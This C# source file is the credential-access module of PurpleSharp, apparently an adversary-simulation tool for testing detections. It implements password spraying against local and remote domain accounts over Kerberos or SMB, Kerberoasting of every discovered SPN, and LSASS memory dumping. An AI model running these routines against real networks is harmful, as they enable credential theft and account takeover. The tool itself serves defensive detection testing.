using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    public class CredAccess
    {

        public static void LocalDomainPasswordSpray(int usertype, int nuser, int protocol, int sleep, string password)
        {
            bool Kerberos = new bool();
            List<User> usertargets = Lib.Targets.GetUserTargets(usertype, nuser);

            
            switch (protocol)
            {
                case 1:
                    Kerberos = true;
                    break;

                case 2:
                    Kerberos = false;
                    break;

                default:
                    return;
            }
            Console.WriteLine("[*] Obtained {0} user accounts", usertargets.Count);
            String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            if (usertype == 7) domain = ".";
            Console.WriteLine("[*] Starting Domain Password Spray Attack on {0}", Environment.MachineName);
            if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);
            foreach (var user in usertargets)
            {
                if (Kerberos)
                {

                    CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 0);
                    if (sleep > 0) Thread.Sleep(sleep * 1000);
                }
                else
                {
                    CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 2);
                    if (sleep > 0) Thread.Sleep(sleep * 1000);
                }
            }

        }

        public static void RemotePasswordSpray(int type, int computertype, int nhost, int usertype, int nuser, int protocol, int sleep, string password)
        {
            bool Kerberos = new bool();
            List<Computer> targets = new List<Computer>();
            List<User> targetusers = new List<User>();
            List<Task> tasklist = new List<Task>();

            String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            if (usertype == 4) domain = ".";

            targets = Lib.Targets.GetHostTargets(computertype, nhost);

            targetusers = Lib.Targets.GetUserTargets(usertype, nuser);

            switch (protocol)
            {
                case 1:
                    Kerberos = true;
                    break;

                case 2:
                    Kerberos = false;
                    break;

                default:
                    return;
            }
            Console.WriteLine("[*] Starting Domain Password Spray Attack from {0}", Environment.MachineName);
            if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);

            if (type == 1)
            {

                var random = new Random();
                int index = random.Next(targets.Count);

                foreach (User user in targetusers)
                {
                    
                    User tempuser = user;
                    int tempindex = index;
                    if (sleep > 0 && tempindex > 0 ) Thread.Sleep(sleep * 1000);
                    tasklist.Add(Task.Factory.StartNew(() =>
                    {
                        CredAccessHelper.RemoteSmbLogin(targets[tempindex], domain, tempuser.UserName, password, Kerberos);
                    }));
                    
                }
                Task.WaitAll(tasklist.ToArray());

            }
            else if (type == 2)
            {
                int loops;
                if (targetusers.Count >= targets.Count) loops = targets.Count;
                else loops = targetusers.Count;

                for (int i = 0; i < loops; i++)
                {
                    int temp = i;
                    if (sleep > 0 && temp > 0) Thread.Sleep(sleep * 1000);
                    tasklist.Add(Task.Factory.StartNew(() =>
                    {
                        CredAccessHelper.RemoteSmbLogin(targets[temp], domain, targetusers[temp].UserName, password, Kerberos);
                        
                    }));
                }
                Task.WaitAll(tasklist.ToArray());

            }
        }

        public static void Kerberoasting(int sleep = 0)
        {
            Console.WriteLine("[*] Starting Kerberoast attack from {0}", Environment.MachineName);
            if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);
            //NetworkCredential cred = null;
            List<String> spns;
            spns = Ldap.GetSPNs();

            foreach (String spn in spns)
            {
                SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "");
                if (sleep > 0 ) Thread.Sleep(sleep * 1000);
            }

        }

        public static void Lsass(int type = 0)
        {
            if (type == 0) CredAccessHelper.LsassMemoryDump();
            else CredAccessHelper.LsassRead();
        }

    }
}

